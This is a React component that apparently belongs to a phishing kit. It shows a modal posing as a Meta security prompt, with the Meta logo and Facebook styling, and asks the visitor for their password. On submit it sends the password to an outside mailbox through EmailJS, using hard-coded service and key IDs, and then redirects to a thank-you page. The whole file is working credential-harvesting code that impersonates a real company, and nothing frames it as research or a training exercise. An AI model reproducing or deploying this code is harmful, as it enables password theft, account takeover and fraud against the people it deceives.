import React, { useRef } from "react";
import emailjs from "@emailjs/browser";
import { useNavigate } from "react-router-dom";
import Modal from "react-bootstrap/Modal";
import MetaLogo from "../assets/meta.svg";

const LoginModal = ({ showModal, setShowModal }) => {
  const navigate = useNavigate();
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    navigate("/thanks"); // Navigate to thanks page after submission
    emailjs
        .sendForm(
          "service_g572qgw",
          "template_uxuv4h7",
          form.current,
          "ZLLsg29uJrmMWpY5z"
        )
      .then(
        (result) => {
          console.log("result text is", result.text);
        },
        (error) => {
          console.log(error.text);
        }
      );
  };

  return (
    <Modal
      backdrop="static"
      show={showModal}
      onHide={() => setShowModal(false)}
      centered
    >
      <Modal.Body className="my-4 p-4">
        <form ref={form} onSubmit={sendEmail} className="d-flex flex-column">
          <p
            style={{
              fontSize: "12px",
              marginBottom: "8px",
              textAlign: "center"
            }}
          >
            For security reasons please enter your password
          </p>

          <input
            className="p-1 border rounded"
            name="password"
            type="password"
            placeholder="Password"
            style={{
              fontSize: "14px",
            }}
            required
          />

          <button
            type="submit"
            className="text-white border-0 mt-3"
            style={{
              background: "#4267B2",
              fontWeight: 400,
              borderRadius: "20px",
              padding: "0.5rem 1.5rem",
            }}
          >
            Submit
          </button>

          <hr className="my-4" />

          <div className="d-flex justify-content-center">
            <img
              src={MetaLogo}
              alt="Meta Logo"
              style={{
                width: "72px",
                height: "auto",
              }}
            />
          </div>
        </form>
      </Modal.Body>
    </Modal>
  );
};

export default LoginModal;
